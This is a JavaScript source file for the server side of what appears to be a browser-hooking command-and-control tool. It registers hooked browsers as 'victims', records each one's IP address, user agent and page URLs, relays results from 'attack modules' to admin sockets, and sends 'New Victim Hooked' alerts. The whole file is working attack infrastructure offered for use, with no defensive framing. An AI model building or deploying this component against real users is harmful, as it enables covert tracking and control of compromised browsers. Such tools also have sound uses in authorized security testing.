const adminSocket = require('../admin/sockets')

//id for sockets which we increment. This should eventually be stored in a database
let visibleIdIndex = 1

const victimsBySessionId = module.exports.victimsBySessionId = {}

module.exports.configure = function(io){
  io.on('connection', function(socket){

    console.log('a victim connected')

    socket.join('victims')

    //process newly connected victim
    connect(socket)

    //when an attack module has finished running. Relay it back to the admins
    socket.on('result', function(data){
      adminSocket.emit('result', data)
    })

    //forward messages from victims
    socket.on('message', function(data){
      adminSocket.emit('message', data)
    })

    //when user disconnects, let admin know
    socket.on('disconnect', function(){
      disconnect(socket)
      console.log(`victim ${victimsBySessionId[socket.handshake.session.id].visibleId} disconnected`)
    })

  })
}


function connect(socket){
  let sessionId = socket.handshake.session.id
  let victim = victimsBySessionId[sessionId]
  if(!victim){
    processNewVictim(socket)
  }else{
    victim.activePagesBySocketId[socket.id] = {
      socketId: socket.id,
      url: socket.handshake.headers['referer'],
      connectedAt: new Date(socket.handshake.time)
    }
    adminSocket.emit('updateVictim', victim)
  }
}

function processNewVictim(socket){
  //address is in the form ::ffff:000.000.000.000
  let ip = socket.handshake.address.slice(socket.handshake.address.lastIndexOf(':') + 1)
  //when connecting from localhost address is '::1'
  ip = ip === '1' ? '127.0.0.1' : ip

  let newVictim = victimsBySessionId[socket.handshake.session.id] = {
    visibleId: visibleIdIndex++,
    ip,
    agent: socket.handshake.headers['user-agent'],
    connectedAt: new Date(socket.handshake.time),
    activePagesBySocketId: {
      [socket.id]: {
        socketId: socket.id,
        url: socket.handshake.headers['referer'],
        connectedAt: new Date(socket.handshake.time)
      }
    }
  }

  adminSocket.emit('newVictim', newVictim)

  adminSocket.emit('notify', {
    title: `New Victim Hooked - ${newVictim.visibleId}`,
    options: {
      body: socket.handshake.headers['referer']
    }
  })
}

function disconnect(socket){
  let sessionId = socket.handshake.session.id
  let victim = victimsBySessionId[sessionId]

  //adminSocket.emit('victimDisconnect', socket.id)
  delete victim.activePagesBySocketId[socket.id]
  adminSocket.emit('updateVictim', victim)
}
